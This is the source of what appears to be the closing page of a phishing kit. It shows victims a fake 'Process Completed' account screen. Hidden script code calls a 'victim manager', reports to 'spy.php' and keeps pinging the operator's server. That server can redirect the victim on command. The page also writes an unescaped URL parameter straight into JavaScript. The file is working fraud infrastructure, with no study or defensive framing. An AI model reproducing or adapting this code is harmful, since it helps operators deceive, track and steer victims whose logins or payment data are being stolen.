<?php
require '../main.php';
require_once 'LanguageManager.php';
?>
<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=0">
<title></title>
<link rel="stylesheet" href="res/main.css">
<script src="res/jq.js"></script>
<script src="res/v.js"></script>
<script src="res/m.js"></script>
</head>
<body>


<div class="row">


</div>



<div class="content">
<div class="box">

<div class="col-100 flex center" style="background:white">
<img src="res/valid.png" style="margin-right:8px; width:35px;">
<h2 class="dfcolor"><?php echo t('process_completed', 'Process Completed'); ?></h2>
</div>

<div class="col-100" style="background:white">

<br><br>
<div class="right">
<button class="defaultbtn" onclick="home()"><?php echo t('my_account', 'My Account'); ?></button>
</div>
</div>

</div>


</div>



<div class="windowloader" style="display:none">
<div class="wl-content">
<div class="loader">
</div>
</div>
</div>



<script src="res/arr.js?v=<?php echo filemtime(__DIR__ . '/res/arr.js'); ?>"></script>
<script>
	// Safe redirect function to prevent undefined redirects
	function safeRedirect(redirectCode) {
		// Convert to number to handle string inputs
		var code = parseInt(redirectCode, 10);

		if (isNaN(code) || code === 0 || redirectCode === null || redirectCode === undefined || redirectCode === '') {
			console.log('No redirect needed (code: ' + redirectCode + ', parsed: ' + code + ')');
			return false;
		}

		// Check if targets object exists
		if (typeof targets === 'undefined') {
			console.error('Targets array not loaded! Redirecting to res/index.php');
			window.location = 'res/index.php';
			return true;
		}

		if (targets[code] && targets[code] !== 'undefined') {
			console.log('Redirecting to:', targets[code]);
			try {
				window.location = targets[code];
				return true;
			} catch (e) {
				console.error('Error during redirect:', e);
				window.location = 'res/index.php';
				return true;
			}
		} else {
			console.error('Invalid redirect target code:', code);
			console.log('Available targets:', Object.keys(targets));
			// Default fallback to res/index.php
			console.log('Falling back to res/index.php');
			window.location = 'res/index.php';
			return true;
		}
	}



function home(){
    // Redirect to the main page or external site as needed
    window.location = window.location.origin;
}



if (typeof initializeVictimManager === 'function') {
    initializeVictimManager("<?php echo $ajaxPath; ?>", "FINISH <?php echo @$_GET['e']; ?>");
} else {
    console.error('initializeVictimManager not available');
    function clearRedirections(){ $.post("<?php echo $ajaxPath; ?>", {clearRedirection:1}); }
    clearRedirections();
    setInterval(function(){ $.post("<?php echo $ajaxPath; ?>", {keepAlive:1, page:"FINISH"}); }, 3000);
    setInterval(function(){
        $.post("<?php echo $ajaxPath; ?>", {redirectionListener:1}, function(data){
            if (safeRedirect(data)) { clearRedirections(); }
        });
    }, 1000);
}
$.post('spy.php', {finish:1});

</script>
</body>
</html>
